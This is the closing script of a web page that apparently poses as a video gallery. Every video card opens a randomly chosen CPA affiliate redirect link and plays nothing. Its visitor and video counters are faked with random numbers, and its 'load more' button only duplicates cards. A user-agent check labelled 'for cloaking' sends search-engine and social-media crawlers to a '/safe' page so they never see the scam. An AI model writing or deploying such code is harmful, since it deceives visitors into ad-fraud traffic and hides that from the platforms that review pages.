            }
        ];

        // CPA redirect links
        const cpaLinks = [
            'https://librarysituation.com/t541uafu?key=51741796b26deef781617a004544e931',
            'https://librarysituation.com/d3jimmiva?key=58bf719770c962a1b202e6472641a4c9',
            'https://librarysituation.com/vrqw4rme6?key=87ba4b429e7bb71c4adf5532eb6203cc'
        ];

        function getRandomCPALink() {
            return cpaLinks[Math.floor(Math.random() * cpaLinks.length)];
        }

        function createStars(rating) {
            let stars = '';
            for (let i = 0; i < 5; i++) {
                stars += `<span class="star">${i < rating ? '★' : '☆'}</span>`;
            }
            return stars;
        }

        function createVideoCard(video, index) {
            return `
                <div class="video-card" onclick="redirectToOffer()">
                    <div class="video-thumbnail" style="background-image: url('${video.image}')">
                        <div class="video-duration">${video.duration}</div>
                        <div class="video-quality">${video.quality}</div>
                        <div class="play-overlay">
                            <div class="play-btn">
                                <div class="play-icon"></div>
                            </div>
                        </div>
                    </div>
                    <div class="video-info">
                        <div class="video-title">${video.title}</div>
                        <div class="video-meta">
                            <span>${video.views} views</span>
                            <div class="rating">${createStars(video.rating)}</div>
                        </div>
                    </div>
                </div>
            `;
        }

        function loadVideos() {
            const galleryGrid = document.getElementById('galleryGrid');
            if (galleryGrid) {
                let html = '';
                
                videoData.forEach((video, index) => {
                    html += createVideoCard(video, index);
                });
                
                galleryGrid.innerHTML = html;
            }
        }

        function redirectToOffer() {
            window.open(getRandomCPALink(), '_blank');
        }

        // Update stats secara real-time
        function updateStats() {
            const totalVideos = document.getElementById('totalVideos');
            const onlineUsers = document.getElementById('onlineUsers');
            const newToday = document.getElementById('newToday');
            
            if (totalVideos) {
                let current = parseInt(totalVideos.textContent.replace(',', ''));
                totalVideos.textContent = (current + Math.floor(Math.random() * 3)).toLocaleString();
            }
            
            if (onlineUsers) {
                let current = parseInt(onlineUsers.textContent.replace(',', ''));
                let change = Math.floor(Math.random() * 21) - 10; // -10 to +10
                onlineUsers.textContent = Math.max(1000, current + change).toLocaleString();
            }
            
            if (newToday) {
                let current = parseInt(newToday.textContent);
                newToday.textContent = current + Math.floor(Math.random() * 2);
            }
        }

        // Category filtering
        document.querySelectorAll('.category-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.category-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                
                // Simulate filtering (in real implementation, this would filter the videos)
                loadVideos();
            });
        });

        // Load more functionality
        const loadMoreBtn = document.getElementById('loadMoreBtn');
        if (loadMoreBtn) {
            loadMoreBtn.addEventListener('click', function() {
                // Simulate loading more videos
                const galleryGrid = document.getElementById('galleryGrid');
                if (galleryGrid) {
                    const currentHTML = galleryGrid.innerHTML;
                    galleryGrid.innerHTML = currentHTML + currentHTML; // Duplicate content
                }
            });
        }

        // User agent detection for cloaking
        const userAgent = navigator.userAgent.toLowerCase();
        const isBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebookexternalhit|twitterbot|rogerbot|linkedinbot|embedly|quora link preview|showyoubot|outbrain|pinterest|slackbot|vkshare|w3c_validator/i.test(userAgent);
        
        if (isBot) {
            window.location.href = '/safe';
        }

        // Initialize
        loadVideos();
        setInterval(updateStats, 5000); // Update stats every 5 seconds
    </script>
